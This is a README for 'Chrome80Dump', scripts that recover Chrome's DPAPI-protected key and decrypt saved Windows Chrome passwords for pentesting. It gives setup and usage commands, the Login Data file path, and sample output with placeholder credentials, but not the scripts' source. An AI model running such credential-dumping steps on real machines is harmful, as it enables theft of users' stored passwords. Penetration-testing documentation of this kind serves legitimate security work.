# Chrome80Dump

A small pair of scripts to dump saved Google Chrome passwords on Windows.

The logic for this changed in Chrome 80, and I wasn't able to find a more recent tool that worked for my use case (pentesting Windows machines while living off the land). So I made my own! One PowerShell script to recover the key, and one Python script for local decryption.

Many thanks to LimerBoy on StackOverflow, whose answer to this question served as the basis for this tool: https://stackoverflow.com/a/61333362

## Setup

You should only have to install the one Python dependency (pycryptodome):

`pip install -r requirements.txt`

## Usage

First, you need to recover the encryption key used to protect the passwords. This itself is encrypted using the Windows DPAPI, so you'll need to be running in the same (user) context as your target.

```
PS> .\get-key.ps1
B47AC088441230478567F441E4B024CCF71A07184E06F072FFD3D14CACCE8C64
```

Then, you can either read the database directly (if your target has a Python installation with the dependencies), or make a local copy and read that.

The usual location for the file is `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`. Generally Chrome needs to not be running to have access to the database.

```
PS> python .\dump-passwords.py --db chrome.db --key B47AC088441230478567F441E4B024CCF71A07184E06F072FFD3D14CACCE8C64
URL:            https://www.google.com/
Username:       email@website.net
Password:       password123

URL:            https://www.saltybet.com/
Username:       email@website.net
Password:       secure1!
```